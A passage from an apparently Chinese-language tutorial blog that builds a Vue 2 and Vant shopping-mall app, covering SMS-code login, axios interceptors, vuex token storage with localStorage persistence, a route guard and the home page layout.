getCode 中加入一行判断</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 短信验证码获取</span></span><br><span class="line">    <span class="title function_">getCode</span> () {</span><br><span class="line">      <span class="comment">// 校验手机号和图形验证码格式</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="title function_">validFn</span>()) { <span class="keyword">return</span> }</span><br><span class="line">      ...</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h3 id="封装发送短信验证码请求"><a class="markdownIt-Anchor" href="#封装发送短信验证码请求"></a> 封装发送短信验证码请求</h3><p>转到 login.js 中进行封装（结合接口文档）</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getMsgCode</span> = (<span class="params">captchaCode, captchaKey, mobile</span>) =&gt; {</span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">post</span>(<span class="string">"/captcha/sendSmsCaptcha"</span>, {</span><br><span class="line">    <span class="attr">form</span>: {</span><br><span class="line">      captchaCode,</span><br><span class="line">      captchaKey,</span><br><span class="line">      mobile,</span><br><span class="line">    },</span><br><span class="line">  });</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>然后在短信验证码获取函数 getCode 中加入调用代码</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 短信验证码获取</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">getCode</span> () {</span><br><span class="line">      <span class="comment">// 发送获取短信验证码的请求</span></span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">getMsgCode</span>(<span class="variable language_">this</span>.<span class="property">picCode</span>, <span class="variable language_">this</span>.<span class="property">picKey</span>, <span class="variable language_">this</span>.<span class="property">phoneNum</span>)</span><br><span class="line">      <span class="comment">// console.log(res)</span></span><br><span class="line">      <span class="title class_">Toast</span>(<span class="string">'短信发送成功，请注意查收'</span>)</span><br><span class="line">      ...</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h3 id="实现登录功能-封装登录接口"><a class="markdownIt-Anchor" href="#实现登录功能-封装登录接口"></a> 实现登录功能 - 封装登录接口</h3><p>封装登录请求</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">codeLogin</span> = (<span class="params">mobile, smsCode</span>) =&gt; {</span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">post</span>(<span class="string">"/passport/login"</span>, {</span><br><span class="line">    <span class="attr">form</span>: {</span><br><span class="line">      <span class="attr">isParty</span>: <span class="literal">false</span>,</span><br><span class="line">      mobile,</span><br><span class="line">      <span class="attr">partyData</span>: {},</span><br><span class="line">      smsCode,</span><br><span class="line">    },</span><br><span class="line">  });</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>绑定登录按钮事件为 login，绑定用户输入的短信验证码为 smsCode（默认短信为 246810）</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 登录功能</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">login</span> () {</span><br><span class="line">      <span class="comment">// 校验手机号和图形验证码格式</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="title function_">validFn</span>()) { <span class="keyword">return</span> }</span><br><span class="line">      <span class="comment">// 校验输入的短信验证码格式</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="regexp">/^\d{6}$/</span>.<span class="title function_">test</span>(<span class="variable language_">this</span>.<span class="property">smsCode</span>)) {</span><br><span class="line">        <span class="title class_">Toast</span>(<span class="string">'请输入正确的短信验证码！'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">codeLogin</span>(<span class="variable language_">this</span>.<span class="property">phoneNum</span>, <span class="variable language_">this</span>.<span class="property">smsCode</span>)</span><br><span class="line">      <span class="keyword">if</span> (res.<span class="property">status</span> === <span class="number">200</span>) {</span><br><span class="line">        <span class="title class_">Toast</span>(<span class="string">'登录成功'</span>)</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(<span class="string">'/home'</span>)</span><br><span class="line">      } <span class="keyword">else</span> {</span><br><span class="line">        <span class="title class_">Toast</span>(<span class="string">'登录失败，请检查手机号和验证码是否正确'</span>)</span><br><span class="line">      }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>后面失败的多种情况可以通过响应拦截器进行处理，在这里暂时只考虑成功的情况</p><h2 id="响应处理器统一处理错误提示"><a class="markdownIt-Anchor" href="#响应处理器统一处理错误提示"></a> 响应处理器统一处理错误提示</h2><p>对 utils 包下的 request 拦截器进行修改</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 响应拦截器</span></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">response</span>) {</span><br><span class="line">    <span class="comment">// 2xx 范围内的状态码都会触发该函数。</span></span><br><span class="line">    <span class="comment">// 对响应数据做点什么 (默认axios会对响应多包装一层data，所以这里需要取出data)</span></span><br><span class="line">    <span class="keyword">const</span> res = response.<span class="property">data</span>;</span><br><span class="line">    <span class="keyword">if</span> (res.<span class="property">status</span> !== <span class="number">200</span>) {</span><br><span class="line">      <span class="title class_">Toast</span>(res.<span class="property">message</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(res.<span class="property">message</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  },</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">error</span>) {</span><br><span class="line">    <span class="comment">// 超出 2xx 范围的状态码都会触发该函数。</span></span><br><span class="line">    <span class="comment">// 对响应错误做点什么</span></span><br><span class="line">    <span class="keyword">if</span> (error.<span class="property">response</span>) {</span><br><span class="line">      <span class="comment">// 服务器返回了错误响应</span></span><br><span class="line">      <span class="title class_">Toast</span>(<span class="string">`服务器错误: <span class="subst">${error.response.data.status}</span>`</span>);</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (error.<span class="property">request</span>) {</span><br><span class="line">      <span class="comment">// 请求已发出，但没有收到响应</span></span><br><span class="line">      <span class="title class_">Toast</span>(<span class="string">"请求超时或网络错误"</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      <span class="comment">// 其他错误</span></span><br><span class="line">      <span class="title class_">Toast</span>(<span class="string">"请求配置错误"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">  }</span><br><span class="line">);</span><br></pre></td></tr></tbody></table></figure><h2 id="登录权证信息存储"><a class="markdownIt-Anchor" href="#登录权证信息存储"></a> 登录权证信息存储</h2><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408291344002.png" alt="image-20240829134402875"></p><p>使用 vuex 构建 user 模块存储登录权证（token 和 userID）。好处是易获取、响应式，分模块便于管理维护。</p><p>在 store 包下新建 modules 包，然后在 modules 包下新建 user.js</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> {</span><br><span class="line">  <span class="attr">namespaced</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="title function_">state</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">      <span class="comment">// 个人权证</span></span><br><span class="line">      <span class="attr">userInfo</span>: {</span><br><span class="line">        <span class="attr">token</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">userId</span>: <span class="string">""</span>,</span><br><span class="line">      },</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">mutations</span>: {</span><br><span class="line">    <span class="title function_">setUserInfo</span>(<span class="params">state, obj</span>) {</span><br><span class="line">      state.<span class="property">userInfo</span> = obj;</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">actions</span>: {},</span><br><span class="line">  <span class="attr">getters</span>: {},</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>然后在 vuex 中进行挂载</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">User</span> <span class="keyword">from</span> <span class="string">"@/store/modules/user"</span>;</span><br><span class="line"></span><br><span class="line"><span class="attr">modules</span>: {</span><br><span class="line">  <span class="title class_">User</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>并在登录页面将要实现跳转到首页的前一刻完成用户权证信息的存储</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">"User/setUserInfo"</span>, res.<span class="property">data</span>);</span><br></pre></td></tr></tbody></table></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408291411700.png" alt="image-20240829141130620"></p><h2 id="vuex-持久化处理"><a class="markdownIt-Anchor" href="#vuex-持久化处理"></a> vuex 持久化处理</h2><p>vuex 刷新就会丢失信息，于是引入持久化存储。我们将获取、设置和移除信息的操作封装为 storage 模块。</p><p>在 utils 包下新建一个 storage.js</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 约定一个通用键名</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">INFO_KEY</span> = <span class="string">"go_shopping_info"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getInfo</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> defaultInfo = {</span><br><span class="line">    <span class="attr">token</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">userId</span>: <span class="string">""</span>,</span><br><span class="line">  };</span><br><span class="line">  <span class="keyword">const</span> info = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="variable constant_">INFO_KEY</span>);</span><br><span class="line">  <span class="comment">// 判断info是否有值</span></span><br><span class="line">  <span class="keyword">return</span> info ? <span class="title class_">JSON</span>.<span class="title function_">parse</span>(info) : defaultInfo;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">setInfo</span> = (<span class="params">obj</span>) =&gt; {</span><br><span class="line">  <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="variable constant_">INFO_KEY</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">removeInfo</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(<span class="variable constant_">INFO_KEY</span>);</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>然后到 vuex 的 user 子模块中进行导入使用即可</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { getInfo, setInfo } <span class="keyword">from</span> <span class="string">"@/utils/storage"</span>;</span><br></pre></td></tr></tbody></table></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408291432317.png" alt="image-20240829143212223"></p><h2 id="添加请求-loading-效果"><a class="markdownIt-Anchor" href="#添加请求-loading-效果"></a> 添加请求 Loading 效果</h2><p>需求分析：有时候因为网络原因，一次请求的结果可能需要一段时间后才能回来。此时，需要给用户添加 loading 提示。</p><p>添加 loading 提示的好处：</p><ol><li><strong>节流处理</strong>：防止用户在一次请求还没回来之前，多次进行点击，发送无效请求</li><li><strong>友好提示</strong>：告知用户，目前是在加载中，请耐心等待，用户体验会更好</li></ol><p>加在哪呢？可以统一加在拦截器中，这样一来后面也可以复用：</p><ol><li><strong>请求拦截器</strong>中，每次请求，打开 loading</li><li><strong> 响应拦截器</strong>中，每次响应，关闭 loading</li></ol><p>转到 utils 包下的 request 拦截器，在请求的时候显示 Toast 提示，并设置背景不可点击且使其不会定时消失，只能由我们清除。</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">instance.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(<span class="keyword">function</span> (<span class="params">config</span>) {</span><br><span class="line">  <span class="comment">// 在发送请求之前做些什么</span></span><br><span class="line">  <span class="comment">// 发送请求时显示Toast提示，背景不可点击</span></span><br><span class="line">  <span class="title class_">Toast</span>.<span class="title function_">loading</span>({</span><br><span class="line">    <span class="attr">message</span>: <span class="string">'加载中...'</span>,</span><br><span class="line">    <span class="attr">forbidClick</span>: <span class="literal">true</span>, <span class="comment">// 禁止背景点击</span></span><br><span class="line">    <span class="attr">duration</span>: <span class="number">0</span> <span class="comment">// 值为0时，toast不会自动关闭</span></span><br><span class="line">  })</span><br><span class="line">  <span class="keyword">return</span> config</span><br><span class="line">}, <span class="keyword">function</span> (<span class="params">error</span>) {...})</span><br></pre></td></tr></tbody></table></figure><p>在响应拦截器添加清除提示的代码</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对响应数据做点什么 (默认axios会对响应多包装一层data，所以这里需要取出data)</span></span><br><span class="line"><span class="keyword">const</span> res = response.<span class="property">data</span>;</span><br><span class="line"><span class="keyword">if</span> (res.<span class="property">status</span> !== <span class="number">200</span>) {</span><br><span class="line">  <span class="title class_">Toast</span>(res.<span class="property">message</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(res.<span class="property">message</span>);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">  <span class="comment">// 关闭Toast提示</span></span><br><span class="line">  <span class="title class_">Toast</span>.<span class="title function_">clear</span>();</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> res;</span><br></pre></td></tr></tbody></table></figure><h2 id="全局路由前置守卫"><a class="markdownIt-Anchor" href="#全局路由前置守卫"></a> 全局路由前置守卫</h2><p><a href="https://router.vuejs.org/zh/guide/">Vue-router 官网地址</a></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408291814256.png" alt="image-20240829181413117"><br>在 router 中编写：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">'@/store'</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义数组存储需要登录才能访问的路由</span></span><br><span class="line"><span class="keyword">const</span> authNeedRouters = [<span class="string">'/myorder'</span>, <span class="string">'/pay'</span>, <span class="string">'/productdetail/:id'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建全局路由前置守卫</span></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> {</span><br><span class="line">  <span class="comment">// 判断to的path是否存在登录的路由数组中</span></span><br><span class="line">  <span class="keyword">if</span> (!authNeedRouters.<span class="title function_">includes</span>(to.<span class="property">path</span>)) {</span><br><span class="line">    <span class="comment">// 不需要登录，直接进入</span></span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="comment">// 判断是否有token（实际上需要调用后端接口校验token）</span></span><br><span class="line">    <span class="keyword">const</span> token = store.<span class="property">state</span>.<span class="property">User</span>.<span class="property">userInfo</span>.<span class="property">token</span></span><br><span class="line">    <span class="keyword">if</span> (token) {</span><br><span class="line">      <span class="comment">// 有token，可以进入</span></span><br><span class="line">      <span class="title function_">next</span>()</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      <span class="comment">// 没有token，跳转到登录页</span></span><br><span class="line">      <span class="title function_">next</span>(<span class="string">'/login'</span>)</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><h2 id="首页"><a class="markdownIt-Anchor" href="#首页"></a> 首页</h2><h3 id="完成首页静态结构"><a class="markdownIt-Anchor" href="#完成首页静态结构"></a> 完成首页静态结构</h3><p>要用到的 vant 组件有</p><ul><li>search（搜索框）</li><li>swipe &amp; swipe-item （轮播图）</li><li>grid &amp; grid-item （宫格）</li></ul><p>grid 宫格主要是使用自定义列数的：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408291915006.png" alt="image-20240829191508887" style="zoom:50%;"></p><p>所以在 utils 包下的 vant2-ui.js 中进行添加：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vant2-ui.js按需导入组件</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">"vue"</span>;</span><br><span class="line"><span class="keyword">import</span> {</span><br><span class="line">  <span class="title class_">Button</span>,</span><br><span class="line">  <span class="title class_">Tabbar</span>,</span><br><span class="line">  <span class="title class_">TabbarItem</span>,</span><br><span class="line">  <span class="title class_">NavBar</span>,</span><br><span class="line">  <span class="title class_">Toast</span>,</span><br><span class="line">  <span class="title class_">Search</span>,</span><br><span class="line">  <span class="title class_">Swipe</span>,</span><br><span class="line">  <span class="title class_">SwipeItem</span>,</span><br><span class="line">  <span class="title class_">Grid</span>,</span><br><span class="line">  <span class="title class_">GridItem</span>,</span><br><span class="line">} <span class="keyword">from</span> <span class="string">"vant"</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Tabbar</span>);</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">TabbarItem</span>);</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Button</span>);</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">NavBar</span>);</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Toast</span>);</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Search</span>);</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Swipe</span>);</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">SwipeItem</span>);</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Grid</span>);</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">GridItem</span>);</span><br></pre></td></tr></tbody></table></figure><p>静态结构和样式 <code>layout/home.vue</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="home"&gt;</span><br><span class="line">    &lt;!-- 导航条 --&gt;</span><br><span class="line">    &lt;van-nav-bar title="智慧商城" fixed /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 搜索框 --&gt;</span><br><span class="line">    &lt;van-search</span><br><span class="line">      readonly</span><br><span class="line">      shape="round"</span><br><span class="line">      background="#f1f1f2"</span><br><span class="line">      placeholder="请在此输入搜索关键词"</span><br><span class="line">      @click="$router.push('/search')"</span><br><span class="line">    /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 轮播图 --&gt;</span><br><span class="line">    &lt;van-swipe class="my-swipe" :autoplay="3000" indicator-color="white"&gt;</span><br><span class="line">      &lt;van-swipe-item&gt;</span><br><span class="line">        &lt;img src="@/assets/banner1.jpg" alt="" /&gt;</span><br><span class="line">      &lt;/van-swipe-item&gt;</span><br><span class="line">      &lt;van-swipe-item&gt;</span><br><span class="line">        &lt;img src="@/assets/banner2.jpg" alt="" /&gt;</span><br><span class="line">      &lt;/van-swipe-item&gt;</span><br><span class="line">      &lt;van-swipe-item&gt;</span><br><span class="line">        &lt;img src="@/assets/banner3.jpg" alt="" /&gt;</span><br><span class="line">      &lt;/van-swipe-item&gt;</span><br><span class="line">    &lt;/van-swipe&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 导航 --&gt;</span><br><span class="line">    &lt;van-grid column-num="5" icon-size="40"&gt;</span><br><span class="line">      &lt;van-grid-item</span><br><span class="line">        v-for="item in 10"</span><br><span class="line">        :key="item"</span><br><span class="line">        icon="http://cba.itlike.com/public/uploads/10001/20230320/58a7c1f62df4cb1eb47fe83ff0e566e6.png"</span><br><span class="line">        text="新品首发"</span><br><span class="line">        @click="$router.push('/category')"</span><br><span class="line">      /&gt;</span><br><span class="line">    &lt;/van-grid&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 主会场 --&gt;</span><br><span class="line">    &lt;div class="main"&gt;</span><br><span class="line">      &lt;img src="@/assets/main.png" alt="" /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 猜你喜欢 --&gt;</span><br><span class="line">    &lt;div class="guess"&gt;</span><br><span class="line">      &lt;p class="guess-title"&gt;—— 猜你喜欢 ——&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="goods-list"&gt;</span><br><span class="line">        &lt;GoodsItem v-for="item in 10" :key="item"&gt;&lt;/GoodsItem&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import GoodsItem from "@/components/GoodsItem.vue";</span><br><span class="line">export default {</span><br><span class="line">  name: "HomePage",</span><br><span class="line">  components: {</span><br><span class="line">    GoodsItem,</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang="less" scoped&gt;</span><br><span class="line">// 主题 padding</span><br><span class="line">.home {</span><br><span class="line">  padding-top: 100px;</span><br><span class="line">  padding-bottom: 50px;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 导航条样式定制</span><br><span class="line">.van-nav-bar {</span><br><span class="line">  z-index: 999;</span><br><span class="line">  background-color: 